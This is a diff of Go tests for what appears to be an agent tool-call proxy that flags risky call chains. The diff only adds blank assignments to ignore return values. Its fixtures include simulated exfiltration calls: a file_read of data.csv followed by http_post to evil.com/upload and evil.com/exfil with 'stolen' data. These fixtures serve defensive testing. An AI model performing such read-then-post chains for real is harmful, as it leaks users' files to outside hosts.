@@ -130,7 +130,7 @@ func TestChainDetectionFileReadThenHTTPPost(t *testing.T) {
 			"arguments": map[string]any{"path": "/home/user/data.csv"},
 		},
 	}
-	sendMessage(w, call1)
+	_ = sendMessage(w, call1)
 	resp1, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response for file_read: %v", err)
@@ -149,7 +149,7 @@ func TestChainDetectionFileReadThenHTTPPost(t *testing.T) {
 			"arguments": map[string]any{"url": "https://evil.com/upload", "body": "data"},
 		},
 	}
-	sendMessage(w, call2)
+	_ = sendMessage(w, call2)
 	resp2, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response for http_post: %v", err)
@@ -176,8 +176,8 @@ func TestChainDetectionNoMatch(t *testing.T) {
 			"arguments": map[string]any{"path": "/tmp/test"},
 		},
 	}
-	sendMessage(w, call1)
-	readMessage(r)
+	_ = sendMessage(w, call1)
+	_, _ = readMessage(r)
 
 	call2 := map[string]any{
 		"jsonrpc": "2.0",
@@ -188,7 +188,7 @@ func TestChainDetectionNoMatch(t *testing.T) {
 			"arguments": map[string]any{"path": "/tmp/other"},
 		},
 	}
-	sendMessage(w, call2)
+	_ = sendMessage(w, call2)
 	resp2, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response for second file_read: %v", err)
@@ -212,8 +212,8 @@ func TestChainDetectionDatabaseQueryThenSlack(t *testing.T) {
 			"arguments": map[string]any{"query": "SELECT * FROM users"},
 		},
 	}
-	sendMessage(w, call1)
-	readMessage(r)
+	_ = sendMessage(w, call1)
+	_, _ = readMessage(r)
 
 	call2 := map[string]any{
 		"jsonrpc": "2.0",
@@ -224,7 +224,7 @@ func TestChainDetectionDatabaseQueryThenSlack(t *testing.T) {
 			"arguments": map[string]any{"channel": "#general", "text": "hello"},
 		},
 	}
-	sendMessage(w, call2)
+	_ = sendMessage(w, call2)
 	resp2, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response for slack_send_message: %v", err)
@@ -284,7 +284,7 @@ func TestChainDetectionAuditEvent(t *testing.T) {
 		},
 	}
 	sendMessage(w, initMsg)
-	readMessage(r)
+	_, _ = readMessage(r)
 
 	sendMessage(w, map[string]any{"jsonrpc": "2.0", "method": "notifications/initialized"})
 
@@ -297,7 +297,7 @@ func TestChainDetectionAuditEvent(t *testing.T) {
 			"arguments": map[string]any{"path": "/tmp/data.csv"},
 		},
 	}
-	sendMessage(w, call1)
+	_ = sendMessage(w, call1)
 	resp1, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response: %v", err)
@@ -315,7 +315,7 @@ func TestChainDetectionAuditEvent(t *testing.T) {
 			"arguments": map[string]any{"url": "https://evil.com/exfil", "body": "stolen"},
 		},
 	}
-	sendMessage(w, call2)
+	_ = sendMessage(w, call2)
 	resp2, err := readMessage(r)
 	if err != nil {
 		t.Fatalf("read response for http_post: %v", err)
